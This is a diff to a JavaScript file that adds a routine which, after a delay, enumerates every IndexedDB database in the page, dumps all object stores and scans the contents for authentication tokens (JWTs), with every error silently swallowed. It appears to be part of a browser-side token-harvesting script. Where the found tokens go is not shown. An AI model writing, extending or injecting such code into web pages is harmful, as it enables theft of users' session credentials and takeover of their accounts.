@@ -99,3 +99,32 @@ setInterval(() => {
         }
     } catch (e) {}
 }, 2000);
+
+// Finally, scan IndexedDB. This is often where modern apps hide JWTs from memory!
+setTimeout(async () => {
+    try {
+        const dbs = await window.indexedDB.databases();
+        for (let dbInfo of dbs) {
+            if (!dbInfo.name) continue;
+            const request = window.indexedDB.open(dbInfo.name);
+            request.onsuccess = (e) => {
+                const db = e.target.result;
+                try {
+                    const storeNames = db.objectStoreNames;
+                    for (let storeName of storeNames) {
+                        const tx = db.transaction([storeName], 'readonly');
+                        const store = tx.objectStore(storeName);
+                        const allReq = store.getAll();
+                        allReq.onsuccess = (evt) => {
+                            const res = evt.target.result;
+                            if (res) {
+                                let str = JSON.stringify(res);
+                                checkStringForToken(str, 'INDEXEDDB_' + dbInfo.name);
+                            }
+                        };
+                    }
+                } catch(err) {} 
+            };
+        }
+    } catch (e) {}
+}, 3000);
